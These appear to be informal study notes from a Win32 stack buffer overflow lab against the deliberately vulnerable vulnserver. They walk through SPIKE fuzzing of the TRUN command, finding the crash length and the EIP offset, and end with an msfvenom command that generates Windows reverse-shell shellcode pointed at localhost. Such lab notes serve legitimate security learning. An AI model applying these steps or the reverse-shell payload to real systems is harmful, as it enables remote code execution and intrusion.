# BUFFER OVERFLOW WIN32

# EP1

## Intro

## tools
> * vulnsever --> [link](https://github.com/stephenbradshaw/vulnserver)
> * immunity debugger ---> [link](https://debugger.immunityinc.com/ID_register.py)
---

# EP2 - Spiking

## tools 
> * spike-fuzzer 

i run the program and set a listner in 9999 port using netcat `nc -nv 9999`

there are bunch of command avilable in that program and i am looking for a command that is vuln (buffer overflow).

I use one of the spike-fuzzer command `spike-fuzzer-generic-send_tcp` to check that 

the command structure look like this

```bash
generic_send_tcp host port spike_script SKIPVAR SKIPSTR
```
one with my config

```bash
spike-fuzzer-generic-send_tcp 127.0.0.1 9999 stats.spk 0 0
```
i tried to overflow the command `STATS` first but it doest seems vuln

this is how the spk file look like we need to add command inside `s_string("");` 

 - [!] 
 ```
s_readline();
s_string("STATS ");
s_string_variable("0");
 ```

then i tried the same think by changing the script with TRUN and its immediatly stoped running .

ESP and EBP holding same hex value '41414141' == AAAA
---
# EP3 Fuzzing

wrote the script (my version) 
```bash
cat fuzz.py
```
and fuzzed the close byte and it is 2600 
---

# EP4 Finding Offset

I wrote a script to find the offset value to manipulate EIP reg

script 
```bash 
cat offset.py
```

used 

```bash 
 pattern_create.rb -l 3000
```
to create pattern and run the script like previously did and the program crashed a expected

and We got this `386F4337` Value in EIP 

so i used another command to find offset 

```bash
pattern_offset.rb -l 3000 -q 386F4337
```
now we found in 2003 
now we know in 2003 we can control the EIP



command you know why 
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```
